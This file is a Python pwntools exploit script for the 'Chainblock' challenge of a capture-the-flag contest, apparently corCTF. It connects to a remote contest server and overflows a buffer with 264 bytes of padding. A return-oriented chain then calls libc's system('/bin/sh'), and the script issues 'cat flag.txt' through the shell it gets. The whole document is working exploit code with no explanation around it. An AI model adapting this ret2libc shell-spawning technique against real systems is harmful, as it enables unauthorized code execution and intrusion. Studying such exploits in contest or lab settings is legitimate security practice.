from pwn import *
import struct
import sys
import os

run_locally = False
os.chdir("./cor_ctf/Pwn/Chainblock")

elf = ELF("./chainblock")

if run_locally:
    p = elf.process()
else:
    host = "pwn.be.ax"
    port = 5000
    p = remote(host,port)

print(p.recvuntil("name:").decode('utf-8'))

libc = ELF("libc.so.6")
libc.address = 0x7ffff7dd5000 #Static

pop_rdi = 0x0000000000401493 # pop rdi; ret
bin_sh = next(libc.search(b"/bin/sh"))
ret_gadget = 0x000000000040101a # ret
system_addr = libc.symbols["system"]
print("System addr:",hex(system_addr))
print("Bin_sh addr:",hex(bin_sh))

rop_chain = [
    pop_rdi, bin_sh, ret_gadget, system_addr
]

rop_chain = b''.join([ p64(entry) for entry in rop_chain])
print(rop_chain)
print(len( b'Techlead' + b'\x00' + b'A'*(16*16-1)))

payload = b'Techlead' + b'\x00' + b'A'*(16*16-1) + rop_chain
payload = b'A'*264 + rop_chain
outFile = open("exp.txt", "wb")
outFile.write(payload)
outFile.close()

p.sendline(payload)
p.sendline(b"cat flag.txt")

print(p.recvall().decode('utf-8'))